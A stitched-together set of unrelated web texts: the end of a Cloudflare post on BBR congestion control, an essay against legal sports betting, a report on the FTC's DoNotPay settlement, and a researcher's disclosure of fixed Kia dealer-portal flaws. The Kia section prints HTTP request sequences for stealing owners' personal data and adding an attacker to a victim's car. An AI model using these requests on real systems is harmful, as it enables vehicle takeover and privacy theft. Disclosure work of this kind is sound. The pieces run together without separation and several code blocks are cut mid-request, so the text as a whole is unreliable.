BBR is an advanced congestion control algorithm, initially developed by Google. BBR seeks to estimate the actual available bandwidth and the minimum round-trip time (RTT) to determine the optimal data flow. This approach allows BBR to maintain high throughput while minimizing latency, leading to more efficient and stable network performance.</p><p><a href="https://github.com/google/bbr/blob/v3/README.md"><u>BBR v3</u></a>, the latest iteration, builds on the strengths of its predecessors BBRv1 and BBRv2 by further refining its bandwidth estimation techniques and enhancing its adaptability to varying network conditions. We found BBR v3 to be faster in several cases compared to our previous implementation of <a href="https://datatracker.ietf.org/doc/html/rfc8312"><u>CUBIC</u></a>. Most importantly, it reduced loss and retransmission rates in our <a href="https://blog.cloudflare.com/introducing-oxy/"><u>Oxy</u></a> proxy implementation.</p>
            <figure>

            </figure><p>With these promising results, we are excited to test various congestion control algorithms including BBRv3 for <a href="https://github.com/cloudflare/quiche"><u>quiche</u></a>, our QUIC implementation, across our HTTP/3 traffic. Combining the layer 4 server-timing information with experiments in this area will enable us to explicitly control and measure the impact on real-world metrics.</p><h2>The future</h2><p>The future of the Internet relies on continuous innovation to meet the growing demands for speed, security, and scalability. Technologies like Zstandard for compression, BBR for congestion control, HTTP/3 prioritization, and Encrypted Client Hello are setting new standards for performance and privacy. By implementing these protocols, web services can achieve faster page load times, more efficient bandwidth usage, and stronger protections for user data.</p><p>These advancements don't just offer incremental improvements, they provide a significant leap forward in optimizing the user experience and safeguarding online interactions. At Cloudflare, we are committed to making these technologies accessible to everyone, empowering businesses to deliver better, faster, and more secure services.&nbsp;</p><p>Stay tuned for more developments as we continue to push the boundaries of what's possible on the web and if you’re passionate about building and implementing the latest Internet innovations, we’re <a href="https://www.cloudflare.com/careers/jobs/"><u>hiring</u></a>!</p></div></section><div><p>Cloudflare's connectivity cloud protects <a target="_blank" href="https://www.cloudflare.com/network-services/" rel="noreferrer">entire corporate networks</a>, helps customers build <a target="_blank" href="https://workers.cloudflare.com/" rel="noreferrer">Internet-scale applications efficiently</a>, accelerates any <a target="_blank" href="https://www.cloudflare.com/performance/accelerate-internet-applications/" rel="noreferrer">website or Internet application</a>, <a target="_blank" href="https://www.cloudflare.com/ddos/" rel="noreferrer">wards off DDoS attacks</a>, keeps <a target="_blank" href="https://www.cloudflare.com/application-security/" rel="noreferrer">hackers at bay</a>, and can help you on <a target="_blank" href="https://www.cloudflare.com/products/zero-trust/" rel="noreferrer">your journey to Zero Trust</a>.</p><p>Visit <a target="_blank" href="https://one.one.one.one/" rel="noreferrer">1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.</p><p>To learn more about our mission to help build a better Internet, <a target="_blank" href="https://www.cloudflare.com/learning/what-is-cloudflare/" rel="noreferrer">start here</a>.

They cheered, they ate, and—more than ever—they gambled. The American Gaming Association <a data-event-element="inline link" href="https://www.americangaming.org/resources/2024-nfl-wagering-estimates/">expects</a> $35 billion in bets to be placed on NFL games in 2024, about one-third more than last year’s total.</p><p data-flatplan-paragraph="true">If you follow sports, gambling is everywhere.

Before 2018, sports gambling was prohibited almost everywhere. Now <a data-event-element="inline link" href="https://www.americangaming.org/research/state-gaming-map/">it’s legal</a> in 38 states and the District of Columbia, <a data-event-element="inline link" href="https://www.goldmansachs.com/insights/articles/why-us-sports-betting-could-become-a-45-billion">yielding</a> $10 billion a year in revenue.</p><p data-flatplan-paragraph="true">Readers may be quick to dismiss these developments as harmless. Many sports fans enjoy betting on the game, they say. Is it such a big deal if they do it with a company rather than their friends?</p><p data-flatplan-paragraph="true">A growing body of social-science literature suggests that, yes, this is in fact quite different. The rise of sports gambling has caused a wave of financial and familial misery, one that falls disproportionately on the most economically precarious households. Six years into the experiment, the evidence is convincing: Legalizing sports gambling was a huge mistake.</p><p data-flatplan-paragraph="true">Starting in 1992, sports betting was generally banned throughout most of the United States under the Professional and Amateur Sports Protection Act. PASPA <a data-event-element="inline link" href="https://www.govinfo.gov/content/pkg/STATUTE-106/pdf/STATUTE-106-Pg4227.pdf">forbade</a> running gambling “schemes” tied to competitive sports. Americans could still make bets with one another about Super Bowl results, but neither government nor businesses could get a cut of the action.</p><p data-flatplan-paragraph="true">That approach held until 2012, when New Jersey, fearing that Atlantic City was losing its competitive edge, legalized sports gambling. The NCAA brought suit, alleging a violation of PASPA; the state responded that PASPA itself was an infringement on its sovereignty. The case came before the Supreme Court, which in 2018 <a data-event-element="inline link" href="https://www.supremecourt.gov/opinions/17pdf/16-476_dbfi.pdf#page=10">ruled</a> that PASPA violated the Tenth Amendment’s prohibition on the federal government exercising powers reserved for the states.</p><p data-flatplan-paragraph="true">With PASPA gone, states were eager to let sportsbooks set up shop. Within a year and a half, Goldman Sachs <a data-event-element="inline link" href="https://www.goldmansachs.com/insights/articles/why-us-sports-betting-could-become-a-45-billion">estimated</a>, Americans were betting about $50 million a month. By late 2023, that figure exceeded $1 billion a month—a 20-fold increase.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/ideas/archive/2024/06/pro-athletes-sports-betting-problem/678725/">Keith O’Brien: Risking everything to lose money</a></p><p data-flatplan-paragraph="true">Because different states legalized sports gambling at different times, social scientists can compare different measures of well-being in states that did legalize with those that did not, before and after legalization.</p><p data-flatplan-paragraph="true">Alarming patterns have started to emerge. Two recent working papers look at the economic impacts of legalization. <a data-event-element="inline link" href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4881086">One</a>, by Northwestern University’s Scott Baker and colleagues, finds that legal sports gambling depletes households’ savings. Specifically, for every $1 spent on betting, households put $2 less into investment accounts. States see big increases in the risk of overdrafting a bank account or maxing out a credit card. These effects are strongest among already precarious households.</p><p data-flatplan-paragraph="true">A <a data-event-element="inline link" href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4903302">second paper</a>, from the economists Brett Hollenbeck of UCLA and Poet Larsen and Davide Proserpio of the University of Southern California, tells a similar story. Looking specifically at <i>online </i>sports gambling, they find that legalization increases the risk that a household goes bankrupt by 25 to 30 percent, and increases debt delinquency. These problems seem to concentrate among young men living in low-income counties—further evidence that those most hurt by sports gambling are the least well-off.</p><p data-flatplan-paragraph="true">A third <a data-event-element="inline link" href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4938642">recent paper</a>, from the University of Oregon economists Kyutaro Matsuzawa and Emily Arnesen, shows another, perhaps more surprising—and certainly more harrowing—harm of gambling legalization: domestic violence. <a data-event-element="inline link" href="https://davidcard.berkeley.edu/papers/card-dahl-family-violence.pdf">Earlier research</a> found that an NFL home team’s upset loss causes a 10 percent increase in reported incidents of men being violent toward their partner. Matsuzawa and Arnesen extend this, finding that in states where sports betting is legal, the effect is even bigger. They estimate that legal sports betting leads to a roughly 9 percent increase in intimate-partner violence.</p><p data-flatplan-paragraph="true">Because of the studies’ design, these results reveal what sports gambling <i>causes</i>, not merely what it correlates with. And the numbers they reveal are of course not only numbers but human lives. Sports gambling <a data-event-element="inline link" href="https://mnapg.org/wp-content/uploads/2021/02/Comprehensive-Review-of-Sports-Wagering-and-Gambling-Addiction-2019-Winte.pdf">is addictive</a>; although many people can do just a little of it, some keep playing compulsively, well past the point of no return. This yields not only debt and bankruptcy but emotional instability and even violence. The problems don’t stop there: Gambling addiction has been connected to anxiety, depression, and even <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9645554/">suicide</a>.</p><p data-flatplan-paragraph="true">The industry may claim to want to prevent problem gambling, but its profits largely come from the compulsions of people with a problem. A small number of people place the large majority of bets—about 5 percent of bettors spent 70 percent of the money <a data-event-element="inline link" href="https://theconversation.com/data-from-new-jersey-is-a-warning-sign-for-young-sports-bettors-197865">in New Jersey</a> in late 2020 and early 2021, for example. The costs of gambling concentrate among those least able to pay, setting back those who most need help. That dollar that could have gone to buying a home, getting a degree, or escaping debt instead goes to another wager. Such behavior is irresponsible, but it’s hard to blame bettors alone when companies make their profits by <a data-event-element="inline link" href="https://link.springer.com/article/10.1007/s11469-008-9186-9">pushing them</a> to bet more.</p><p data-flatplan-paragraph="true">Legalization isn’t yielding many benefits, either. Tax revenue—one of the major justifications for legalization—has been anemic, with all 38 legal states combined <a data-event-element="inline link" href="https://www.census.gov/library/stories/2024/02/legal-sports-betting.html">making</a> only about $500 million from it a quarter, less than alcohol, tobacco, or marijuana. And it hasn’t even shrunk the illegal market, at least in Massachusetts, <a data-event-element="inline link" href="https://www.wwlp.com/news/report-legalization-didnt-undercut-illegal-sports-betting/">where</a> bettors were just as likely to use unauthorized betting sites after legalization.</p><p data-flatplan-paragraph="true">Against this backdrop, PASPA-era prohibition looks comparatively benign. Americans could bet with one another, but businesses couldn’t profit off of it. Arrests for gambling were <a data-event-element="inline link" href="https://cde.ucr.cjis.gov/LATEST/webapp/#/pages/explorer/crime/arrest">basically nonexistent</a>, meaning prohibition had limited human cost.</p><p data-flatplan-paragraph="true">For little obvious gain, most states have permitted businesses to make billions of dollars off of the most economically precarious among us. Some <a data-event-element="inline link" href="https://www.slowboring.com/p/the-sports-gambling-industry-needs">commentators</a> and <a data-event-element="inline link" href="https://www.cnbc.com/2024/09/13/federal-bill-regulations-sports-betting-operators-safe-bet-act.html">politicians</a> have—falteringly—recognized these costs, and suggested careful regulation around the edges to address them.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/technology/archive/2023/08/espn-sports-betting-mobile-gambling/674967/">Amanda Mull: Sports betting won</a></p><p data-flatplan-paragraph="true">But the more elegant solution is the blunter one: ban sports gambling once again. Unlike regulation—which is complex, hard to get right, and challenged by near-certain industry capture of regulatory bodies—prohibition cuts the problem off at the root. No legal sports gambling, no sports-gambling industry.</p><p data-flatplan-paragraph="true">For the dozen states, including Texas and California, where sports gambling is still illegal, the solution is simple: change nothing. For the other states, undoing the damage may be harder. But it is damage worth undoing. If the states are “laboratories of democracy,” then the results of their experiment with sports gambling are in, and they are uniformly negative. Better to end the study now than prolong the suffering.</p></section></div>]]></description>

<p>Among the first AI companies that the Federal Trade Commission has exposed as deceiving consumers is DoNotPay—which initially was advertised as "the world's first robot lawyer" with the ability to "sue anyone with the click of a button."</p>
<p>On Wednesday, the FTC <a href="https://www.ftc.gov/news-events/news/press-releases/2024/09/ftc-announces-crackdown-deceptive-ai-claims-schemes">announced</a> that it took action to stop DoNotPay from making bogus claims after learning that the AI startup conducted no testing "to determine whether its AI chatbot’s output was equal to the level of a human lawyer." DoNotPay also did not "hire or retain any attorneys" to help verify AI outputs or validate DoNotPay's legal claims.</p>
<p>DoNotPay accepted no liability. But to settle the charges that DoNotPay violated the FTC Act, the AI startup agreed to pay $193,000 if the FTC's consent agreement is confirmed following a 30-day public comment period. Additionally, DoNotPay agreed to warn "consumers who subscribed to the service between 2021 and 2023" about the "limitations of law-related features on the service," the FTC said.</p>
<p>Moving forward, DoNotPay would also be prohibited under the settlement from making baseless claims that any of its features can be substituted for any professional service.</p>                                                                        
                                                                                
<p>A DoNotPay spokesperson told Ars that the company "is pleased to have worked constructively with the FTC to settle this case and fully resolve these issues, without admitting liability."</p>
<p>"The complaint relates to the usage of a few hundred customers some years ago (out of millions of people), with services that have long been discontinued," DoNotPay's spokesperson said.</p>
<p>The FTC's settlement with DoNotPay is part of a larger agency effort to crack down on deceptive AI claims. Four other AI companies were hit with enforcement actions Wednesday, the FTC said, and FTC Chair Lina Khan confirmed that the agency's so-called "Operation AI Comply" will continue monitoring companies' attempts to "lure consumers into bogus schemes" or use AI tools to "turbocharge deception."</p>
<p>“Using AI tools to trick, mislead, or defraud people is illegal,” Khan said. “The FTC’s enforcement actions make clear that there is no AI exemption from the laws on the books. By cracking down on unfair or deceptive practices in these markets, FTC is ensuring that honest businesses and innovators can get a fair shot and consumers are being protected.”</p>
<h2>DoNotPay never tested robot lawyer</h2>
<p>DoNotPay was initially released in 2015 as a free way to contest parking tickets. Soon after, it quickly expanded its services to cover 200 areas of law—aiding with everything from breach of contract claims to restraining orders to insurance claims and divorce settlements.</p>
<p>As DoNotPay's legal services expanded, the company defended its innovative approach to replacing lawyers while acknowledging that it was likely on shaky ground. In 2018, DoNotPay CEO Joshua Browder <a href="https://www.abajournal.com/news/article/file_a_smalls_claims_suit_anywhere_in_the_country_through_an_app#google_vignette">confirmed to the ABA Journal</a> that the legal services were provided with "no lawyer oversight." But he said that he was only "a bit worried" about threats to sue DoNotPay for unlicensed practice of law. Because DoNotPay was free, he expected he could avoid some legal challenges.</p>
<p>According to the FTC <a href="https://www.ftc.gov/system/files/ftc_gov/pdf/DoNotPayInc-Complaint.pdf">complaint</a>, DoNotPay began charging subscribers $36 every two months in 2019 while making several false claims in ads to apparently drive up subscriptions.</p>

<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>On June 11th, 2024, we discovered a set of vulnerabilities in Kia vehicles that allowed remote control over key functions using only a license plate. These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription.</p>
<p>Additionally, an attacker could silently obtain personal information, including the victim's name, phone number, email address, and physical address. This would allow the attacker to add themselves as an invisible second user on the victim's vehicle without their knowledge.</p>

<p>We built a tool to demonstrate the impact of these vulnerabilities where an attacker could simply (1) enter the license plate of a Kia vehicle, then (2) execute commands on the vehicle after around 30 seconds. <strong>These vulnerabilities have since been fixed, this tool was never released, and the Kia team has validated this was never exploited maliciously.</strong></p>

<h2 id="vulnerability-writeup">Vulnerability Writeup</h2>
<p>Around two years ago, <a href="https://samcurry.net/web-hackers-vs-the-auto-industry">a few hackers and I hunted for vulnerabilities on over a dozen different car companies</a>. We discovered critical issues that would've allowed attackers to remotely locate, disable starters, unlock, and start an estimated 15.5 million vehicles. There was a big reaction to this. Paul Roberts, founder of The Security Ledger, <a href="https://www.youtube.com/watch?v=U4rzdXibXC0&amp;t=45m15s">even testified about these findings in a US congressional hearing</a>.</p>
<p>Since so much time had passed, we decided to revisit a few of the larger companies to see if we couldn't discover any new issues. The first one we spent time on was Kia.</p>
<p>When we began looking at Kia, we originally focused on the <code>owners.kia.com</code> website and the Kia Connect iOS app <code>com.myuvo.link</code>. Both of these applications were interesting because they could execute internet-to-vehicle commands.</p>
<p>While the owners website and the mobile app served the same purpose, they handled vehicle commands differently. The owners website used a backend reverse-proxy to forward user commands to the <code>api.owners.kia.com</code> backend service that was actually responsible for actually executing vehicle commands, whereas the mobile app instead accessed this API directly.</p>
<p>The following HTTP request shows how the <code>owners.kia.com</code> website will proxy an API request to the <code>api.owners.kia.com</code> host to unlock a car door.</p>
<h4>HTTP Request to Unlock Car Door on the "owners.kia.com" website</h4>
<pre><code><span>POST</span> <span>/apps/services/owners/apigwServlet.html</span> <span>HTTP/2</span>
<span>Host:</span> <span>owners.kia.com</span>
<span>Httpmethod:</span> <span>GET</span>
<span>Apiurl:</span> <span>/door/unlock</span>
<span>Servicetype:</span> <span>postLoginCustomer</span>
<span>Cookie:</span> <span>JSESSIONID=SESSION_TOKEN;</span>
</code></pre>
<p>After sending the above HTTP request that originated from the <code>owners.kia.com</code> website, the Kia backend will generate a <code>Sid</code> session ID header that is consumed by the backend API using our <code>JSESSIONID</code> as auth, then finally send the forwarded HTTP request to the <code>api.owners.kia.com</code> website in the following format.</p>
<h4>HTTP Request Formed and Proxied by Server</h4>
<pre><code><span>GET</span> <span>/apigw/v1/rems/door/unlock</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>api.owners.kia.com</span>
<span>Sid:</span> <span>454817d4-b228-4103-a26f-884e362e8dee</span>
<span>Vinkey:</span> <span>3ecc1a19-aefd-4188-a7fe-1723e1663d6e</span>
</code></pre>
<p>The important headers in the above HTTP request are the <code>Sid</code> (session token) and <code>Vinkey</code> (UUID that indexes to VIN). There are various other headers included that are all necessary to access the API itself, but those are the two related to vehicle access controls. Both of the above HTTP requests were in the same area we had found the original Kia vulnerabilities in 2023.</p>
<p>Since we were already super familiar with the user side of things, we decided to look at the Kia Dealer website instead.</p>
<h4>Targeting Kia Dealer Infrastructure</h4>
<p>Something we'd never tested was how Kia actually performed vehicle activations for new purchases. After speaking to a few people, we learned that Kia would ask for your email address at the dealership and you'd receive a registration link to either register a new Kia account or add your newly purchased vehicle to your pre-existing Kia account.</p>
<p>We asked if they could share the registration links given to them by Kia, and nicely enough, they forwarded their emails. We copied the following URL from the hyperlink:</p>
<pre><code>https://kiaconnect.kdealer.com/content/kDealer/en/kiauser.html?token=dealer_generated_access_token&amp;vin=example_vin&amp;scenarioType=3
</code></pre>
<p>Super interesting! The <code>kiaconnect.kdealer.com</code> domain was one we'd never seen before. We opened the URL and saw the following endpoint:</p>
<figure><img alt="Kiaconnect Initial Vehicle Registration URL" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=3840&amp;q=75"><figcaption>Kiaconnect Initial Vehicle Registration URL</figcaption></figure>
<p>In the above URL, the <code>token</code> parameter (otherwise known as a VIN Key) is an access token generated by a Kia dealer as a one-time grant to modify the vehicle specified in the <code>vin</code> parameter. After loading the above URL, the following HTTP request will be sent to validate that the token has not expired or been used.</p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>

{
  <span>"token":</span> <span>"985a49f0-1fe5-4d36-860e-d9b93272072b"</span>,
  <span>"vin":</span> <span>"5XYP3DHC9NG310533"</span>,
  <span>"scenarioType":</span> <span>3</span>,
  <span>"loginPref":</span> <span>null</span>
}
</code></pre>
<p>Very interesting. The HTTP request sent to validate the one-time access token was being sent to the same <code>/apps/services/kdealer/apigwServlet.html</code> URI as the previous <code>owners.kia.com</code> request, except this time, it was being sent on the Kia Connect dealer website. This likely meant that the dealer infrastructure had a similar forwarding proxy to an internal API for dealership functionality.</p>
<p>We dug through the JavaScript looking for interesting APIGW calls and found what appeared to be employee-only functionality. There were references to dealer vehicle lookup, account lookup, enroll, unenroll, and many more dealer related API calls.</p>
<pre><code><span>dealerVehicleLookUp</span>(<span></span>) {
    <span>this</span>.<span>displayLoader</span> = !<span>0</span>, <span>this</span>.<span>vinToEnroll</span> = <span>"eDelivery"</span> != <span>this</span>.<span>entryPoint</span> ? <span>this</span>.<span>vinToEnroll</span>.<span>replace</span>(<span>/\s/g</span>, <span>""</span>) : <span>this</span>.<span>userDetails</span>.<span>vin</span>, <span>"17"</span> == <span>this</span>.<span>vinToEnroll</span>.<span>length</span> &amp;&amp; <span>this</span>.<span>landingPageService</span>.<span>postOffice</span>({

    }, <span>"/dec/dlr/dvl"</span>, <span>"POST"</span>, <span>"postLoginCustomer"</span>).<span>subscribe</span>(<span><span>i</span> =&gt;</span> {
        i &amp;&amp; (i.<span>hasOwnProperty</span>(<span>"body"</span>) &amp;&amp; <span>"0"</span> == i.<span>body</span>.<span>status</span>.<span>statusCode</span> ? <span>this</span>.<span>processDvlData</span>(i.<span>body</span>) : <span>"1003"</span> == i.<span>body</span>.<span>status</span>.<span>errorCode</span> &amp;&amp; <span>"kia-dealer"</span> == <span>this</span>.<span>entryPoint</span> ? <span>this</span>.<span>reRouteSessionExpire</span>() : (<span>this</span>.<span>displayLoader</span> = !<span>1</span>, <span>this</span>.<span>alertMessage</span> = i.<span>body</span>.<span>status</span>.<span>errorMessage</span>, <span>document</span>.<span>getElementById</span>(<span>"triggerGeneralAlertModal"</span>).<span>click</span>()))
    })
}
</code></pre>
<p>To test if we could access any of these endpoints, we formed the HTTP request to the dealer APIGW endpoint with our own dealer token (<code>Appid</code> header) and the VIN of a vehicle that we owned.</p>
<h4>Attempted HTTP Request to Search VIN using Kia Dealer APIGW Endpoint</h4>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>
<span>Apiurl:</span> <span>/dec/dlr/dvl</span>

{
    <span>"vin":</span> <span>"1HGBH41JXMN109186"</span>
}
</code></pre>
<h4>HTTP Response</h4>
<pre><code><span>HTTP/1.1</span> <span>401</span> <span>Unauthorized</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"status":</span> {
    <span>"statusCode":</span> <span>1</span>,
    <span>"errorType":</span> <span>1</span>,
    <span>"errorCode":</span> <span>1003</span>,
    <span>"errorMessage":</span> <span>"Session Key is either invalid or expired"</span>
  }
}
</code></pre>
<p>Nope. It did not seem like the dealer endpoints wanted to work with the access token that was given to us via email when purchasing a new car.</p>
<p>We thought back to the original <code>owners.kia.com</code> website and then wondered: what if there was a way to just register as a dealer, generate an access token, then use that access token here? The <code>kiaconnect.kdealer.com</code> website seemed to have the same API format, so maybe we could just copy the format, register an account, and login?</p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>
<span>Apiurl:</span> <span>/prof/registerUser</span>

{
  <span>"userCredential":</span> {
    <span>"firstName":</span> <span>"Sam"</span>,
    <span>"lastName":</span> <span>"Curry"</span>,

    <span>"password":</span> <span>"FakePass123!"</span>,
    <span>"acceptedTerms":</span> <span>1</span>
  }
}
</code></pre>
<p>It returned 200 OK! It seemed that we could register on the Kia Dealer website using the same HTTP request to register on the Kia Owners website. We quickly tried to login and generate an access token:</p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>
<span>Apiurl:</span> <span>/prof/authUser</span>

{
  <span>"userCredential":</span> {
    <span>"userId":</span> <span>"normal.user@gmail.com"</span>,
    <span>"password":</span> <span>"FakePass123!"</span>
  }
}
</code></pre>
<p>The login was valid, the server returned an HTTP response with a session cookie.</p>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Sid:</span> <span>123e4567</span><span>-e89b-12d3-a456-426614174000</span>
</code></pre>
<p>We sent our generated access token to the previously unauthorized dealer APIGW endpoint to search a VIN.</p>

</code></pre>
<p>After registering and authenticating to a dealer account, we were able to generate a valid access token that could be used to call the backend dealer APIs! The HTTP response contained the vehicle owner's name, phone number, and email address. We were able to authenticate into the dealer portal using our normal app credentials and the modified channel header. This meant that we could likely hit all other dealer endpoints.</p>
<h4>Taking Over Vehicles</h4>
<p>After sifting through the JavaScript for a few hours, we finally learned how the enrollment, unenrollment, and vehicle modification endpoints worked. The following four HTTP requests could be sent in order to gain access to a victim's vehicle.</p>
<figure><img alt="Full high level attack flow" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=3840&amp;q=75"><figcaption>Full high level attack flow</figcaption></figure>

}
</code></pre>
<ul>
<li>With the added session token header, we are able to access all dealer endpoints on the <code>kiaconnect.kdealer.com</code> website and can retrieve the victim's name, phone number, and email.</li>
</ul>
<p><strong>(3) Modify Owner’s Previous Access using Leaked Email Address and VIN number</strong></p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>

  <span>"dealerCode":</span> <span>"eDelivery"</span>           
}
</code></pre>
<ul>
<li>We send this request to demote the owner of the vehicle so that we can add ourselves as the primary account holders. We must send the victim's email here, which we obtained in step two.</li>
</ul>
<p><strong>(4) Add Attacker to Victim Vehicle</strong></p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>

<span>Appid:</span> <span>123e4567</span><span>-e89b-12d3-a456-426614174000</span>

{
  <span>"vin":</span> <span>"5XYRK4LFXMG016215"</span>,
  <span>"loginId":</span> <span>"attacker@gmail.com"</span>
}
</code></pre>
<ul>
<li>Finally, we'll assign our attacker-controlled email as the primary owner of the vehicle. This will allow us to send arbitrary commands to the vehicle.</li>
</ul>
<p>The above four HTTP requests could be used to send commands to pretty much any Kia vehicle made after 2013 (see "Vehicles Affected" table for specifics) using only the license plate.</p>
<p>From the victim's side, there was no notification that their vehicle had been accessed nor their access permissions modified. An attacker could resolve someone's license plate, enter their VIN through the API, then track them passively and send active commands like unlock, start, or honk.</p>
<p>The impact here was really obvious to us and we reported it to Kia immediately, but while they were working on a fix we decided to build a proof of concept dashboard that better demonstrated the impact of this vulnerability.</p>
<h4>Creating License Plate Takeover Proof of Concept</h4>
<p>The goal of our proof of concept UI was to simply have a dashboard where an attacker could (1) type in the license plate of a Kia vehicle, (2) retrieve the owner's PII, then (3) execute commands on the vehicle.</p>
<p>Because we were adding the victims’ vehicle to our attacker controlled account, we decided to build the proof of concept to have an “exploit” and “garage” page. The exploit page would be used to actually take over the vehicles, then the garage page would be used to issue commands and locate the vehicles.</p>
<p>It worked via the following:</p>
<ul>
<li>The <code>License Plate to VIN</code> form uses a third-party API to convert license plate number to VIN</li>
<li>The <code>Takeover</code> button would do the 4-step process to takeover a victim’s vehicle using the retrieved VIN from the license plate number, by (1) generating a dealer token via the login form, (2) retrieving the email/phone number from the victim’s account, (3) demoting the account owner to an account holder, (4) adding ourselves as the primary account holder.</li>
<li>The <code>Fetch Owner</code> button would passively tell us the name, email, and phone number of the victim</li>
<li>The <code>Garage</code> tab would allow us to list and execute commands on compromised vehicles</li>
</ul>
<p>After building this tool, we recorded a proof of concept using a locked rental Kia. This video included at the start of the blog shows us taking over a vehicle using our phone, then being able to remotely lock/unlock, start/stop, honk, and locate the vehicle.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Cars will continue to have vulnerabilities, because in the same way that Meta could introduce a code change which would allow someone to takeover your Facebook account, car manufacturers could do the same for your vehicle.</p>
